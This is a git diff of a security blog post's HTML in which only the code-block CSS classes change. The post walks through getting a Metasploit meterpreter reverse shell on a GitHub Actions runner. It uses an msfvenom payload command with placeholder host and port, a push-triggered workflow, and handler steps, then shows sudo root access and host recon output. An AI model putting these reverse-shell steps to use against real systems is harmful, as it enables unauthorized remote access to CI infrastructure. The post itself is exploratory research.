@@ -181,18 +181,18 @@
 
 <p>Just like in the previous post on <a href="https://raesene.github.io/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/">Kubernetes shells</a> we’re going to use <a href="https://www.metasploit.com/">Metasploit</a> for this.  So we need a reverse shell payload that we can call back to.  For this, you’ll need to have the port receiving the connection visible on the Internet with no firewall in the way, you could use something like a Digital Ocean droplet or EC2 instance for this.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x64/meterpreter_reverse_http LHOST=YOURIP LPORT=YOURPORT -f elf &gt; reverse_shell.elf
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x64/meterpreter_reverse_http LHOST=YOURIP LPORT=YOURPORT -f elf &gt; reverse_shell.elf
 </code></pre></div></div>
 
-<p>just replace <code class="highlighter-rouge">YOURIP</code> and <code class="highlighter-rouge">YOURPORT</code> with your information.</p>
+<p>just replace <code class="language-plaintext highlighter-rouge">YOURIP</code> and <code class="language-plaintext highlighter-rouge">YOURPORT</code> with your information.</p>
 
 <p>Now we’ve got a shell program, just start a new Github repository and add the shell to the repo.</p>
 
 <h3 id="our-gtihub-action">Our Gtihub Action</h3>
 
-<p>We just need to create our action now that will get triggered when we push changes to our Github repository.  Github actions live in <code class="highlighter-rouge">.github/workflows/</code> and are in YAML format.  Create a file called <code class="highlighter-rouge">testaction.yml</code> in there and you can put something like this into the file.</p>
+<p>We just need to create our action now that will get triggered when we push changes to our Github repository.  Github actions live in <code class="language-plaintext highlighter-rouge">.github/workflows/</code> and are in YAML format.  Create a file called <code class="language-plaintext highlighter-rouge">testaction.yml</code> in there and you can put something like this into the file.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>name: Shell
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>name: Shell
 
 on: [push]
 
@@ -212,14 +212,14 @@ jobs:
 
 <h3 id="metasploit-handler">Metasploit handler</h3>
 
-<p>after running <code class="highlighter-rouge">msfconsole</code> you can do the following steps</p>
+<p>after running <code class="language-plaintext highlighter-rouge">msfconsole</code> you can do the following steps</p>
 
 <ol>
-  <li><code class="highlighter-rouge">use exploit/multi/handler</code></li>
-  <li><code class="highlighter-rouge">set payload linux/x64/meterpreter_reverse_http</code></li>
-  <li><code class="highlighter-rouge">set LHOST YOURIP</code></li>
-  <li><code class="highlighter-rouge">set LPORT YOURPORT</code></li>
-  <li><code class="highlighter-rouge">exploit</code></li>
+  <li><code class="language-plaintext highlighter-rouge">use exploit/multi/handler</code></li>
+  <li><code class="language-plaintext highlighter-rouge">set payload linux/x64/meterpreter_reverse_http</code></li>
+  <li><code class="language-plaintext highlighter-rouge">set LHOST YOURIP</code></li>
+  <li><code class="language-plaintext highlighter-rouge">set LPORT YOURPORT</code></li>
+  <li><code class="language-plaintext highlighter-rouge">exploit</code></li>
 </ol>
 
 <p>Then push your shell and action code to Github to trigger the action, and all being well you should get a shell :)</p>
@@ -230,26 +230,26 @@ jobs:
 
 <p><strong>“Privesc”</strong></p>
 
-<p>When you first get the shell, you’re running as the <code class="highlighter-rouge">runner</code> user but it’s got passwordless <code class="highlighter-rouge">sudo</code> access, so you can just <code class="highlighter-rouge">sudo bash</code> to get <code class="highlighter-rouge">root</code>.</p>
+<p>When you first get the shell, you’re running as the <code class="language-plaintext highlighter-rouge">runner</code> user but it’s got passwordless <code class="language-plaintext highlighter-rouge">sudo</code> access, so you can just <code class="language-plaintext highlighter-rouge">sudo bash</code> to get <code class="language-plaintext highlighter-rouge">root</code>.</p>
 
 <p><strong>Listening ports</strong></p>
 
-<p>Running <code class="highlighter-rouge">ss -ltnp</code> will show us the listening TCP ports</p>
+<p>Running <code class="language-plaintext highlighter-rouge">ss -ltnp</code> will show us the listening TCP ports</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
 LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
 LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
 LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
 LISTEN   0         128                    [::]:22                  [::]:*  
 </code></pre></div></div>
 
-<p>The port <code class="highlighter-rouge">3306/TCP</code> is kind of interesting, as my action didn’t make any use of MySQL.</p>
+<p>The port <code class="language-plaintext highlighter-rouge">3306/TCP</code> is kind of interesting, as my action didn’t make any use of MySQL.</p>
 
 <p><strong>Routing Table</strong></p>
 
-<p>Nothing hugely interesting on the routing table, although interesting that <code class="highlighter-rouge">docker0</code> is there, so we’re running Docker on the runner host.</p>
+<p>Nothing hugely interesting on the routing table, although interesting that <code class="language-plaintext highlighter-rouge">docker0</code> is there, so we’re running Docker on the runner host.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Kernel IP routing table
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Kernel IP routing table
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 0.0.0.0         10.1.0.1        0.0.0.0         UG    100    0        0 eth0
 10.1.0.0        0.0.0.0         255.255.0.0     U     0      0        0 eth0
@@ -264,9 +264,9 @@ Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 
 <p><strong>Users on the host</strong></p>
 
-<p>A quick look at <code class="highlighter-rouge">/etc/passwd</code> shows up a couple of non-standard users</p>
+<p>A quick look at <code class="language-plaintext highlighter-rouge">/etc/passwd</code> shows up a couple of non-standard users</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pollinate:x:110:1::/var/cache/pollinate:/bin/false
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pollinate:x:110:1::/var/cache/pollinate:/bin/false
 mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
 sphinxsearch:x:112:117:Sphinx fulltext search service,,,:/var/run/sphinxsearch:/usr/sbin/nologin
 runneradmin:x:1000:1000:Ubuntu:/home/runneradmin:/bin/bash
